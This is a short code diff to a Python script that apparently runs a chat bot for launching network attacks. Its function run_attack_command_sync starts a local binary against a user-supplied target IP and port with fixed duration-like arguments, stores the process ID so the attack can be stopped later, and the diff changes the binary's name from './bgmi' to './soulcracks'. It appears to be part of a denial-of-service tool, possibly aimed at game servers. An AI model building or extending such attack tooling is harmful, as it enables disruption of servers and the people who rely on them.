@@ -113,7 +113,7 @@ def send_not_approved_message(chat_id):
 # Run attack command synchronously
 def run_attack_command_sync(target_ip, target_port, action):
     if action == 1:
-        process = subprocess.Popen(["./bgmi", target_ip, str(target_port),  "900", "900"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(["./soulcracks", target_ip, str(target_port),  "900", "900"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         active_attacks[(target_ip, target_port)] = process.pid
     elif action == 2:
         pid = active_attacks.pop((target_ip, target_port), None)
@@ -238,7 +238,7 @@ def run_attack_command_sync(target_ip, target_port, action):
 
     if action == 1:  # Start attack
         # Launch the attack process
-        process = subprocess.Popen(["./bgmi", target_ip, str(target_port), "900", "900"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(["./soulcracks", target_ip, str(target_port), "900", "900"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         # Store the PID of the running attack
         active_attacks[(target_ip, target_port)] = process.pid
     elif action == 2:  # Stop attack
